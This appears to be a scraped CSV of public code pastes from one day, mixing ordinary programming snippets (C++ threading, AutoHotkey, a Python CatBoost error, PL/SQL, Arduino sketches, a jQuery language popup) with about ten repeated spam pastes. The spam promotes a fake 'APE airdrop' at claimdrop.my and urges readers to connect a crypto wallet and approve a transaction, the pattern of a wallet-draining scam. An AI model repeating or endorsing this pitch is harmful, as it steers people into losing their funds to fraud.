id,title,username,language,date,content
Aia8Qm4p,🚨 FINAL CALL - $APE AIRDROP 🚨,javaexpert76,JavaScript,Thursday 27th of February 2025 09:46:46 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#BKvR7QS9KC"
Qe1R5s6W,use of atomic and threading,aircampro,C++,Thursday 27th of February 2025 09:43:09 AM CDT,"/*
 * Example of stdatomic incrementing/decrementing a counter and setting a boolean flag when a data value is written, also example of xor on register
 * also shows how to wait for condition variable
 */
#include <stdio.h>
#include <stdlib.h>
// you define NO_LOCK if you do not have std atomic
// #define NO_LOCK
#ifndef NO_LOCK
#include <stdatomic.h>
#include <threads.h>
#endif
#include <atomic>
#include <cassert>
#include <iostream>
//#include <thread>
#include <bitset>

// set this data with a boolena lock flag between threads
int data = 0;
std::atomic<bool> ready(false);

// define the number of times the iterating thread operates
const int loop_iter = 50000;

#define NR_THREADS 2
int value = 0b1011;
std::atomic_ref<int> x{value};

// define a condition variable which triggers a second thread to then run
std::mutex mtx;

// create a function which will increment the count variable
// it should wait for the condition variable set in the decrement function
int func_thread(void *arg)
{
  int i;

#ifndef NO_LOCK
  atomic_int *count = (atomic_int *) arg;
  for (i = 0; i < loop_iter; i++) {
    atomic_fetch_add_explicit(count, 1, memory_order_seq_cst);
  }
#else
  int *count = (int *) arg;
  for (i = 0; i < loop_iter; i++) {
    (*count)++;
  }
#endif
  x.fetch_xor(0b1110);
  std::cout << std::bitset<4>(value).to_string() << std::endl;  

  return 0;
}

int func_dec_thread(void *arg)
{
  int i;

#ifndef NO_LOCK
  atomic_int *count = (atomic_int *) arg;
 
  for (i = 0; i < loop_iter; i++) {
	atomic_fetch_sub_explicit(count, 1, memory_order_seq_cst);
  }
#else
  int *count = (int *) arg;
 
  for (i = 0; i < loop_iter; i++) {
    (*count)--;
  }
#endif

  return 0;
}

// set a value
int producer(void *arg) {
  int *d_in = (int *) arg;
  data = *d_in;
  ready.store(true, std::memory_order_release);                                // Set flag
  return 0;
}

// check value is set to value expected
int consumer(void *arg) {
  int *d_in = (int *) arg;
  while (!ready.load(std::memory_order_acquire));
  assert(data == *d_in);
  return 0;
}

int main(void)
{

  thrd_t th;
  int set_val = 230;
  thrd_start_t func_set = producer;
  // start producer consumer tasks
  if (thrd_create(&th, func_set, &set_val) != thrd_success) {
    fprintf(stderr, ""Error: thrd_create() on producer\n"");
    exit(1);
  }
  thrd_t cons;
  thrd_start_t func_set2 = consumer;
  if (thrd_create(&cons, func_set2, &set_val) != thrd_success) {
    fprintf(stderr, ""Error: thrd_create() on consumer\n"");
    exit(1);
  }

  // now wait on completion the producer consumer tasks uses an atomic bool as the mutex
  if (thrd_join(th, NULL) != thrd_success) {
    fprintf(stderr, ""Error: thrd_join() on producer\n"");
    exit(1);
  }
  if (thrd_join(cons, NULL) != thrd_success) {
    fprintf(stderr, ""Error: thrd_join() on consumer\n"");
    exit(1);
  }
  
  thrd_t thrs[NR_THREADS];
  int i;
  thrd_start_t func = func_thread;
#ifndef NO_LOCK
  volatile atomic_int count = 0;
  volatile atomic_int c_down = 990;
#else
  volatile int count = 0;
  volatile int c_down = 990;
#endif
  thrd_t thrs_d;
  thrd_start_t func_d = func_dec_thread;

  // start the count-up threads  
  for (i = 0; i < NR_THREADS; i++) {
    if (thrd_create(&thrs[i], func, (void*)&count) != thrd_success) {
      fprintf(stderr, ""Error: thrd_create() on increment\n"");
      exit(1);
    }
  }
  printf(""count up = %d\n"", (int)count);
  // start the count-down threads  
  if (thrd_create(&thrs_d, func_d, (void*)&c_down) != thrd_success) {
    fprintf(stderr, ""Error: thrd_create() on decrement\n"");
    exit(1);
  }
  printf(""count down = %d\n"", (int)c_down);
  printf(""count up = %d\n"", (int)count);

  // now join the threads on completion
  if (thrd_join(thrs_d, NULL) != thrd_success) {
    fprintf(stderr, ""Error: thrd_join() on decrement\n"");
    exit(1);
  }  
  for (i = 0; i < NR_THREADS; i++) {
    if (thrd_join(thrs[i], NULL) != thrd_success) {
      fprintf(stderr, ""Error: thrd_join() on increment\n"");
      exit(2);
    }
  }

  printf(""count up = %d\n"", (int)count);
  printf(""count down = %d\n"", (int)c_down);
  
  return 0;
}"
wtGn2TvK,🚨 LAST CHANCE TO CLAIM APE COINS 🚨,cappyx26,JavaScript,Thursday 27th of February 2025 09:31:33 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#UZC7j6qTn9"
fyfDhu7V,Precise steering v3,Mangus875,Autohotkey,Thursday 27th of February 2025 09:22:46 AM CDT,"#Requires AutoHotkey v2.0
#SingleInstance

SetKeyDelay 0, 0
A_HotkeyInterval := 0
SendMode ""input""
CoordMode ""tooltip"", ""screen""

#R::reload
#UseHook 1

keys := [""Numpad0"", ""2"", ""3"", ""4"", ""5""]
ak := [0,0,0,0,0]
lastAk := 0

*Numpad0:: {
	global
	lastAk := 1
	setAk(1)
	KeyWait ""Numpad0""
	setAk(5)
	lastAk := 0
}
*2:: {
	global
	lastAk := 2
	setAk(2)
	KeyWait ""Numpad0""
	setAk(5)
	lastAk := 0
}
*3:: {
	global
	lastAk := 3
	setAk(3)
	KeyWait ""Numpad0""
	setAk(5)
	lastAk := 0
}
*4:: {
	global
	lastAk := 4
	setAk(4)
	KeyWait ""Numpad0""
	setAk(5)
	lastAk := 0
}
*5:: {
	global
	lastAk := 0
	setAk(5)
	KeyWait ""Numpad0""
	setAk(5)
	lastAk := 0
}


SetTimer(updateKeys, 1)

*Left:: {
	global
	
	Send ""{Left down}""
	akCount := 0
	loop ak.length
		akCount += ak[A_Index]
	if (akCount == 2) {
		akPair := getAks()
		if (lastAk != akPair[2])
			setAk(akPair[2])
	} else if (akCount == 1) {
		setAk(getAks()[1], 1)
	}
}

updateKeys() {
	global
	
	akCount := 0
	loop keys.length {
		state := GetKeyState(keys[A_Index], ""P"")
		ak[A_Index] := state
		akCount += state
	}
		
	if (getKeyState(""Left"", ""P"")) {
		Send ""{Left down}""
		aks := getAks()
		if (akCount == 2) {
			if (lastAk != aks[2])
				setAk(aks[2])
		}
	} else {
		aks := getAks()
		if (akCount == 2) {
			if (lastAk != aks[1])
				setAk(aks[1])
		} else {
			Send ""{Left up}""
		}
	}

	if (getKeyState(""Right"", ""P"")) {
		Send ""{Right down}""
		aks := getAks()
		if (akCount == 2) {
			if (lastAk != aks[2])
				setAk(aks[2])
		}
	} else {
		aks := getAks()
		if (akCount == 2) {
			if (lastAk != aks[1])
				setAk(aks[1])
		} else {
			Send ""{Right up}""
		}
	}
}

getAks() {
	global
	akPair := []
	loop ak.length {
		if (ak[A_Index])
			akPair.push(A_Index)
	}
	return akPair
}

press(key) {
	Send ""{"" key "" down}""
	pause 1
	Send ""{"" key "" up}""
	pause 0
}

setAk(key, safe := False) {
	global
	lastAk := key
	if (safe)
		press(keys[5])
	press(keys[key])
}

;setTimer(info, 50)
info() {
	global
	tooltip ak[1] ""`n"" ak[2] ""`n"" ak[3] ""`n"" ak[4] ""`n"" ak[5], 10, 10
}"
2zwMvftF,FREE CRYPTO,cappyx26,JavaScript,Thursday 27th of February 2025 09:21:31 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#RKyDvnWEeD"
igrzjrqD,🔥 Make $500+ from APE AIRDROP 🔥,cappyx26,JavaScript,Thursday 27th of February 2025 09:11:28 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#AKwYgB9pJ6"
6pdMu0ns,🚨 FINAL CALL - $APE AIRDROP 🚨,cappyx26,JavaScript,Thursday 27th of February 2025 09:01:26 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#gK11E4bsOe"
cVwiHwm2,🚨 LAST CHANCE TO CLAIM APE COINS 🚨,cappyx26,JavaScript,Thursday 27th of February 2025 08:51:23 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#w50aDjHBLv"
8teLTVKH,Untitled,trsp,Python,Thursday 27th of February 2025 08:51:06 AM CDT,"# Код fit.py:

import pandas as pd
from sklearn.compose import ColumnTransformer
from sklearn.pipeline import Pipeline
from category_encoders import CatBoostEncoder
from sklearn.preprocessing import StandardScaler, OneHotEncoder
from catboost import CatBoostClassifier
import yaml
import os
import joblib

# обучение модели
def fit_model():
    with open('params.yaml', 'r') as fd:
        params = yaml.safe_load(fd) 

    data = pd.read_csv('data/initial_data.csv')

    cat_features = data.select_dtypes(include='object')
    potential_binary_features = cat_features.nunique() == 2

    binary_cat_features = cat_features[potential_binary_features[potential_binary_features].index]
    other_cat_features = cat_features[potential_binary_features[~potential_binary_features].index]
    num_features = data.select_dtypes(['float'])

    preprocessor = ColumnTransformer(
        [
        ('binary', OneHotEncoder(drop=params[""one_hot_drop""]), binary_cat_features.columns.tolist()),
        ('cat', CatBoostEncoder(return_df=False), other_cat_features.columns.tolist()),
        ('num', StandardScaler(), num_features.columns.tolist())
        ],
        remainder='drop',
        verbose_feature_names_out=False
    )

    model = CatBoostClassifier(auto_class_weights=params[""auto_class_weights""])

    pipeline = Pipeline(
        [
        ('preprocessor', preprocessor),
        ('model', model)
        ]
    )
    pipeline.fit(data, data[""target""]) 

    os.makedirs('models', exist_ok=True)
    with open('models/fitted_model.pkl', 'wb') as fd:
        joblib.dump(pipeline, fd) 


if __name__ == '__main__':
	fit_model()

-----

Ошибка полностью:

Traceback (most recent call last):
  File ""/home/mle-user/mle_projects/mle-dvc/scripts/fit.py"", line 51, in <module>
    fit_model()
  File ""/home/mle-user/mle_projects/mle-dvc/scripts/fit.py"", line 43, in fit_model
    pipeline.fit(data, data[""target""]) 
  File ""/home/mle-user/mle_projects/mle-dvc/.venv_mle-dvc/lib/python3.10/site-packages/sklearn/base.py"", line 1351, in wrapper
    return fit_method(estimator, *args, **kwargs)
  File ""/home/mle-user/mle_projects/mle-dvc/.venv_mle-dvc/lib/python3.10/site-packages/sklearn/pipeline.py"", line 475, in fit
    self._final_estimator.fit(Xt, y, **last_step_params[""fit""])
  File ""/home/mle-user/mle_projects/mle-dvc/.venv_mle-dvc/lib/python3.10/site-packages/catboost/core.py"", line 5100, in fit
    self._fit(X, y, cat_features, text_features, embedding_features, None, sample_weight, None, None, None, None, baseline, use_best_model,
  File ""/home/mle-user/mle_projects/mle-dvc/.venv_mle-dvc/lib/python3.10/site-packages/catboost/core.py"", line 2303, in _fit
    train_params = self._prepare_train_params(
  File ""/home/mle-user/mle_projects/mle-dvc/.venv_mle-dvc/lib/python3.10/site-packages/catboost/core.py"", line 2184, in _prepare_train_params
    train_pool = _build_train_pool(X, y, cat_features, text_features, embedding_features, pairs,
  File ""/home/mle-user/mle_projects/mle-dvc/.venv_mle-dvc/lib/python3.10/site-packages/catboost/core.py"", line 1444, in _build_train_pool
    train_pool = Pool(X, y, cat_features=cat_features, text_features=text_features, embedding_features=embedding_features, pairs=pairs, weight=sample_weight, group_id=group_id,
  File ""/home/mle-user/mle_projects/mle-dvc/.venv_mle-dvc/lib/python3.10/site-packages/catboost/core.py"", line 793, in __init__
    self._init(data, label, cat_features, text_features, embedding_features, embedding_features_data, pairs, weight,
  File ""/home/mle-user/mle_projects/mle-dvc/.venv_mle-dvc/lib/python3.10/site-packages/catboost/core.py"", line 1369, in _init
    self._check_label_empty(label)
  File ""/home/mle-user/mle_projects/mle-dvc/.venv_mle-dvc/lib/python3.10/site-packages/catboost/core.py"", line 905, in _check_label_empty
    raise CatBoostError(""Labels variable is empty."")
_catboost.CatBoostError: Labels variable is empty.
ERROR: failed to reproduce 'fit_model': failed to run: python scripts/fit.py, exited with 1"
SheTjuCA,FREE CRYPTO,cappyx26,JavaScript,Thursday 27th of February 2025 08:41:22 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#TQPJ4BCelq"
U8zfHAUS,Untitled,psi_mmobile,PL/SQL,Thursday 27th of February 2025 08:40:18 AM CDT,"      function getLastScLoadIdFromCreationNumber(p_so_creation_number in number) return number is
        v_poi_tin varchar2(50);
        v_real_employer_tin varchar2(50);
        v_vehicle_owner_id number(10);
        v_last_sc_load_id number(10);
    begin
    -- Get last so transaction : TIN + real_employer_tin + vehicle_owner
    begin
        select sot.poi_tin, p.real_employer_tin, vpc.vehicle_owner_id
        into v_poi_tin,v_real_employer_tin,v_vehicle_owner_id
        from social_office_transaction sot, person p, vo_person_category vpc
        where sot.so_creation_number = p_so_creation_number
        and vpc.vo_person_category_id = p.vo_person_category_id
        and sot.social_office_transaction_id = p.last_so_transaction_id;
        exception when no_data_found then
              return null;
    end;
    if v_poi_tin is not null and v_real_employer_tin is not null and v_vehicle_owner_id is not null then

        -- Get last load with vo_id, and TIN
        begin
        select max(sc_load_id)
        into v_last_sc_load_id
        from sc_load
        where vehicle_owner_id = v_vehicle_owner_id
        and status = 'L'
        and poi_tin = v_poi_tin;
        exception when no_data_found then
              return null;

        end;
        if v_last_sc_load_id is not null then

        -- Within last load
        return v_last_sc_load_id;

        end if;
    end if;
    return null;
    end;"
KiqpEdyG,🔥 Make $500+ from APE AIRDROP 🔥,cappyx26,JavaScript,Thursday 27th of February 2025 08:31:20 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#FrF0eThO7Y"
VX7GhYNT,**Lock Control** rev_11,pleasedontcode,Arduino,Thursday 27th of February 2025 08:26:14 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: **Lock Control**
	- Source Code NOT compiled for: Arduino Nano ESP32
	- Source Code created on: 2025-02-27 14:25:03

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* The servo motor installed in the door will lock or */
	/* unlock based on the correct PIN code received by */
	/* the button. If the door is unlocked and the PIN is */
	/* correct, it will lock. If the door is locked and */
	/* the PIN is correct, it will unlock. */
/****** SYSTEM REQUIREMENT 2 *****/
	/* The webserver provides a web page about lock or */
	/* unlock state of the door. */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <EasyButton.h>	//https://github.com/evert-arias/EasyButton
#include <Deneyap_Servo.h>	//https://github.com/deneyapkart/deneyap-servo-arduino-library
#include <SoftwareSerial.h> // Software serial library
#include <Wire.h>          // I2C library
#include <Adafruit_DS3502.h> // Library for DS3502 digital potentiometer
#include <WiFi.h>          // WiFi library for ESP32
#include <WebServer.h>     // Web server library for ESP32

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void handleRoot(void);
void handleLockUnlock(void);
void updateOutputs();
void sendDataOverHC12();
void receiveDataOverHC12();
void readCurrentFeedback();
void checkButtonPress();
void toggleLockUnlock();

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t codeButton_PushButton_PIN_D9 = 9;

// HC12 connections
#define HC12_TX   6 // Changed to use pin 6 instead of D6 for compatibility
#define HC12_RX   4 // Changed to use pin 4 instead of D4 for compatibility

/***** DEFINITION OF PWM OUTPUT PINS *****/
const uint8_t servo_Servomotor_PWMSignal_PIN_D2 = 2;

/***** DEFINITION OF OUTPUT RAW VARIABLES *****/
uint8_t servo_Servomotor_PWMSignal_PIN_D2_rawData = 0;

/***** DEFINITION OF OUTPUT PHYSICAL VARIABLES *****/
float servo_Servomotor_PWMSignal_PIN_D2_phyData = 0.0;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
EspSoftwareSerial::UART HC12(HC12_TX, HC12_RX);
Adafruit_DS3502 ds3502 = Adafruit_DS3502(); // DS3502 instance

// Current feedback sensor pin
#define CURRENT_FEEDBACK_SENSOR_PIN A0  // A0 pin where the voltage is read
const int numSamples = 10;   // Number of samples to average
float runningSum = 0;        // Variable to store the running sum of readings
int sampleCount = 0;         // Counter to track the number of samples taken

#define HC12_DATA_REPETITION_TIME 1000

int current_setpoint = 0;
int current_feedback = -1;

// WiFi credentials
const char* ssid = ""your_SSID""; // Replace with your SSID
const char* password = ""your_PASSWORD""; // Replace with your password

// Web server on port 80
WebServer server(80);

// Lock state
bool isLocked = true; // Initial state is locked
const String correctPIN = ""1234""; // Example PIN code

void setup(void)
{
    pinMode(codeButton_PushButton_PIN_D9, INPUT_PULLUP);
    pinMode(servo_Servomotor_PWMSignal_PIN_D2, OUTPUT);

    Serial.begin(9600);             // Serial port to computer
    HC12.begin(9600);               // Serial port to HC12
    ds3502.begin();

    // Initialize WiFi
    WiFi.begin(ssid, password);
    while (WiFi.status() != WL_CONNECTED) {
        delay(1000);
        Serial.println(""Connecting to WiFi..."");
    }
    Serial.println(""Connected to WiFi"");

    // Define web server routes
    server.on(""/"", handleRoot);
    server.on(""/lockunlock"", handleLockUnlock);
    server.begin();
}

void loop(void)
{
    updateOutputs(); // Refresh output data
    receiveDataOverHC12();
    sendDataOverHC12();
    readCurrentFeedback();
    server.handleClient(); // Handle web server requests
    checkButtonPress(); // Check for button press
}

void updateOutputs()
{
    analogWrite(servo_Servomotor_PWMSignal_PIN_D2, servo_Servomotor_PWMSignal_PIN_D2_rawData);
}

void sendDataOverHC12() {
    static unsigned long lastTimeSendData = millis();

    if (millis() - lastTimeSendData > HC12_DATA_REPETITION_TIME) {
        HC12.println(String(current_feedback));
        lastTimeSendData = millis();
        Serial.println(""sendData"");
    }
}

void receiveDataOverHC12() {
    if (HC12.available()) {
        String receivedData = HC12.readStringUntil('\n');
        Serial.println(receivedData);
        int current_setpoint_temp = receivedData.toInt();

        if (current_setpoint_temp != current_setpoint) {
            current_setpoint = current_setpoint_temp;
            int digitalPotValue = map(current_setpoint, 0, 500, 0, 127);
            Serial.print(""New current setpoint: "");
            Serial.println(current_setpoint);
            Serial.print(""New Digital Pot value: "");
            Serial.println(digitalPotValue);
            ds3502.setWiper((uint8_t)digitalPotValue);
        }
    }
}

void readCurrentFeedback() {
    static float filteredValue = analogRead(CURRENT_FEEDBACK_SENSOR_PIN); // Initialize with the first reading
    int sensorValue = analogRead(CURRENT_FEEDBACK_SENSOR_PIN);
    filteredValue = (0.2 * sensorValue) + (0.8 * filteredValue);
    current_feedback = map((int)filteredValue, 0, 1023, 0, 500);
}

void checkButtonPress() {
    static EasyButton codeButton(codeButton_PushButton_PIN_D9);
    codeButton.begin();
    codeButton.onPressed([]() {
        toggleLockUnlock();
    });
    codeButton.read();
}

void toggleLockUnlock() {
    // Toggle lock state
    if (isLocked) {
        // Unlock the door
        Serial.println(""Unlocking the door..."");
        servo_Servomotor_PWMSignal_PIN_D2_rawData = 180; // Example value to unlock
        isLocked = false;
    } else {
        // Lock the door
        Serial.println(""Locking the door..."");
        servo_Servomotor_PWMSignal_PIN_D2_rawData = 0; // Example value to lock
        isLocked = true;
    }
}

void handleRoot() {
    String message = ""Door is currently "" + String(isLocked ? ""Locked"" : ""Unlocked"");
    server.send(200, ""text/html"", message);
}

void handleLockUnlock() {
    String pin = server.arg(""pin"");
    if (pin == correctPIN) {
        toggleLockUnlock();
        server.send(200, ""text/html"", ""PIN accepted. Door state changed."");
    } else {
        server.send(403, ""text/html"", ""Incorrect PIN."");
    }
}

/* END CODE */"
PQETCq9N,🚨 FINAL CALL - $APE AIRDROP 🚨,cappyx26,JavaScript,Thursday 27th of February 2025 08:21:18 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#Qijkqj2qQe"
rCULSUR3,dddddd,Igor150195,JavaScript,Thursday 27th of February 2025 08:16:13 AM CDT,"<script>
	document.addEventListener(""DOMContentLoaded"", function() {
		const userLang = navigator.language || navigator.userLanguage;

		let localePostfix;

		if ([""nl"", ""nl-NL""].includes(userLang) && !['/nl'].includes(location.pathname) && !localStorage.getItem(""lang-popup-flag"")) {
			localePostfix = '/nl';

			$('.language-popup-title').html($('.language-popup-title').data('nl'));
			$('.lang-popup-or-text').html($('.lang-popup-or-text').data('nl'));
			$('.lang-popup-dropdown-text').html($('.lang-popup-dropdown-text').data('nl'));
			$('#close-lang-popup').html($('#close-lang-popup').data('nl'));
			$('#confirm-lang-redirect').html($('#confirm-lang-redirect').data('nl'));

			let text = $('#language-popup .w-locales-items a[hreflang=""nl""]').text();
			let img = $('#language-popup .w-locales-items a[hreflang=""nl""]').prev().clone();

			$('#language-popup .w-locales-items a[hreflang=""nl""]').parents('.popup-locale-item').hide();

			//$('#language-popup .popup-lang').text(text);
			$('#language-popup .locale-flag').html(img);

			$('#language-popup').css('display', 'flex');
		} else if ([""fr"", ""fr-FR""].includes(userLang) && !['/fr'].includes(location.pathname) && !localStorage.getItem(""lang-popup-flag"")) {
			localePostfix = '/fr';

			$('.language-popup-title').html($('.language-popup-title').data('fr'));
			$('.lang-popup-or-text').html($('.lang-popup-or-text').data('fr'));
			$('.lang-popup-dropdown-text').html($('.lang-popup-dropdown-text').data('fr'));
			$('#close-lang-popup').html($('#close-lang-popup').data('fr'));
			$('#confirm-lang-redirect').html($('#confirm-lang-redirect').data('fr'));

			let text = $('#language-popup .w-locales-items a[hreflang=""fr-FR""]').text();
			let img = $('#language-popup .w-locales-items a[hreflang=""fr-FR""]').prev().clone();

			$('#language-popup .w-locales-items a[hreflang=""fr-FR""]').parents('.popup-locale-item').hide();

			//$('#language-popup .popup-lang').text(text);
			$('#language-popup .locale-flag').html(img);

			$('#language-popup').css('display', 'flex');
		} else if ([""es"", ""es-ES""].includes(userLang) && !['/es'].includes(location.pathname) && !localStorage.getItem(""lang-popup-flag"")) {
			localePostfix = '/es';

			$('.language-popup-title').html($('.language-popup-title').data('es'));
			$('.lang-popup-or-text').html($('.lang-popup-or-text').data('es'));
			$('.lang-popup-dropdown-text').html($('.lang-popup-dropdown-text').data('es'));
			$('#close-lang-popup').html($('#close-lang-popup').data('es'));
			$('#confirm-lang-redirect').html($('#confirm-lang-redirect').data('es'));

			let text = $('#language-popup .w-locales-items a[hreflang=""es-ES""]').text();
			let img = $('#language-popup .w-locales-items a[hreflang=""es-ES""]').prev().clone();

			$('#language-popup .w-locales-items a[hreflang=""es-ES""]').parents('.popup-locale-item').hide();

			//$('#language-popup .popup-lang').text(text);
			$('#language-popup .locale-flag').html(img);

			$('#language-popup').css('display', 'flex');
		} else if ([""en-GB""].includes(userLang) && !['/gb'].includes(location.pathname) && !localStorage.getItem(""lang-popup-flag"")) {
			localePostfix = '/gb';

			$('.language-popup-title').html($('.language-popup-title').data('gb'));
			$('.lang-popup-or-text').html($('.lang-popup-or-text').data('gb'));
			$('.lang-popup-dropdown-text').html($('.lang-popup-dropdown-text').data('gb'));
			$('#close-lang-popup').html($('#close-lang-popup').data('gb'));
			$('#confirm-lang-redirect').html($('#confirm-lang-redirect').data('gb'));

			let text = $('#language-popup .w-locales-items a[hreflang=""en-GB""]').text();
			let img = $('#language-popup .w-locales-items a[hreflang=""en-GB""]').prev().clone();

			$('#language-popup .w-locales-items a[hreflang=""en-GB""]').parents('.popup-locale-item').hide();

			//$('#language-popup .popup-lang').text(text);
			$('#language-popup .locale-flag').html(img);

			$('#language-popup').css('display', 'flex');
		} else if ([""en-US""].includes(userLang) && ['/gb', '/nl', '/es', '/fr'].includes(location.pathname) && !localStorage.getItem(""lang-popup-flag"")) {
			localePostfix = '';

			let text = $('#language-popup .w-locales-items a[hreflang=""en-US""]').text();
			let img = $('#language-popup .w-locales-items a[hreflang=""en-US""]').prev().clone();

			$('#language-popup .w-locales-items a[hreflang=""en-US""]').parents('.popup-locale-item').hide();

			//$('#language-popup .popup-lang').text(text);
			$('#language-popup .locale-flag').html(img);

			$('#language-popup').css('display', 'flex');
		}

		$('#confirm-lang-redirect').on('click', function() {
			window.location.href = window.location.origin + localePostfix
		});
		$('#close-lang-popup, .close-button').on('click', function() {
			$('#language-popup').css('display', 'none');
		});

		$(document).on('click', function(e) {
			if (!$(e.target).closest('.language-popup-body').length) {
				$('#language-popup').css('display', 'none');
			}
			;
		});

		localStorage.setItem(""lang-popup-flag"", ""true"");
	});
</script>"
izhtM2ws,🚨 FINAL CALL - $APE AIRDROP 🚨,Franzpaolo2611,JavaScript,Thursday 27th of February 2025 08:06:10 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#Eg8mljo2RC"
K6QVtNsy,"""Serial Hello"" rev_05",pleasedontcode,Arduino,Thursday 27th of February 2025 08:02:59 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""Serial Hello""
	- Source Code NOT compiled for: Arduino Pro Mini 3.3V
	- Source Code created on: 2025-02-27 14:02:02

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* print hello */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

void setup(void)
{
	// put your setup code here, to run once:
	Serial.begin(9600); // Initialize serial communication
	Serial.println(""Hello""); // Print hello message
}

void loop(void)
{
	// put your main code here, to run repeatedly:
}

/* END CODE */"
